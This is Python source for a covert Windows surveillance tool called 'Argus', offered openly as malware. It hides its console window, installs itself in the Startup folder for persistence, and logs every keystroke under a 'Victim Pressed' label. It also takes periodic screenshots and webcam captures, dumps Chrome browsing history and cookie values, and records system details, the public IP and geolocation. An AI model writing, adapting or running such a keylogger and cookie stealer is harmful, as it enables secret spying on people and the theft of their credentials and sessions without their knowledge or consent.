                            # You Get The Idea :) 

import time
import os
import threading 
import sys
import platform
import sqlite3
import psutil
import socket
import requests
import urllib.request
import json
from pynput.keyboard import Listener
import logging
from threading import Timer, Thread
from PIL import ImageGrab
from mss import mss
import getpass
import win32console
from win32 import win32gui
import win32ui, win32con, win32api
from ecapture import ecapture as ec







USER_NAME = getpass.getuser()

def hide():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):
        with open('.\\logs\\keylogs\\log.txt', 'a') as f:
            f.write('Victim  Pressed : {}\t  \t{}\n'.format(k, time.ctime()))


    def _build_logs(self):
        if not os.path.exists('.\\logs'):
            os.mkdir('.\\logs')
            os.mkdir('.\\logs\\sysinfo')
            os.mkdir('.\\logs\\screenshots')
            os.mkdir('.\\logs\\keylogs')
            os.mkdir('.\\logs\\chrome')
            os.mkdir('.\\logs\\chrome\\history')
            os.mkdir('.\\logs\\chrome\\cookies')
            os.mkdir('.\\logs\\webcam')



    def sysinfo(self):


       #get system info

        getsysinfo = {'getinfo':platform.uname(), 'getarch':platform.architecture() ,'getversion':sys.version ,'getlogin':os.getlogin(),'getpid':os.getpid(),'getenv':os.getenv('APPDATA'), 'getpid':os.getpid() ,'datetime':time.ctime(time.time())}

        private_ip = socket.gethostbyname(socket.gethostname())

        public_ip = requests.get('http://ip.42.pl/raw').text

        #getlocation


        with urllib.request.urlopen("https://geolocation-db.com/json") as url:

            data = json.loads(url.read().decode())
    

        combined = f"""[+++] Argus Started At {getsysinfo['datetime']} [+++] [+++] Windows Victim System info in detail : {getsysinfo['getinfo']} [+++] [+++] Python Version : {getsysinfo['getversion']} 
        [+++] System Architecture : {getsysinfo['getarch']} [+++] [+++] User : {getsysinfo['getlogin']} [+++] [+++] PID : {getsysinfo['getpid']} [+++] [+++] Home Environment : {getsysinfo['getenv']} [+++]\n 
        [+++] Public IP Address : {public_ip} [+++] [+++] Private IP Address : {private_ip} [+++] [+++] Location : {data} [+++]  """


        
        #output = open(r'' + f'.\\logs\\sysinfo{time.time()}.txt', 'wb')
        repr(combined)
        f = open(f'.\\logs\\sysinfo\\{time.time()}.txt', 'w')
        f.write(repr(combined) + '\n')
        f.close()

        
        
 

        #Chrome
    def dump_history(self):


        # dump Chrome History I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process And This could be danger if you doing it for real!
        try:
            con = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History")
            cur = con.cursor()
            output_file = open(r'' + f'.\\logs\\chrome\\history\\{time.time()}.txt', 'a')
            cur.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cur.fetchall():
                output_file.write("Website: %s \n\t Title: %s \n\t Last Visited: %s \n\n" % (
                u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
                u''.join(str(row[2])).encode('utf-8').strip()))
            output_file.close()

        except Exception:
            pass



            #Chrome
    def dump_cookies(self):


        #dump Chrome Cookies I suuggest Keep The try and except Block For Chrome As It Requires Killing The Process And This could be danger if you doing it for real!
        try:
            con = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
            cur = con.cursor()
            output_file = open(r'' + f'.\\logs\\chrome\\cookies\\{time.time()}.txt', 'a')
            cur.execute('SELECT host_key, name, value FROM Cookies')
            for row in cur.fetchall():

                output_file.write("Hostname: %s \n\t Name: %s \n\t Value: %s \n\n" % (u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),u''.join(row[2]).strip()))
            output_file.close()

        except Exception as e:
            print(e)



    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):

        
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))






    def webcam(self): #Webcam Shoot
        
        try:

    
            ec.capture(0,False,f".\\logs\\webcam{time.time()}.jpg")
        
        
        except Exception:
            pass

                    #interval in Seconds default is 60S ~ 1MIN
    def run(self, interval=60):
        
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()
        IntervalTimer(interval, self.dump_history).start()
        IntervalTimer(interval, self.dump_cookies).start()



if __name__ == '__main__':
    hide()
    add_to_startup()
    mon = Monitor()
    mon.run()
    mon.sysinfo()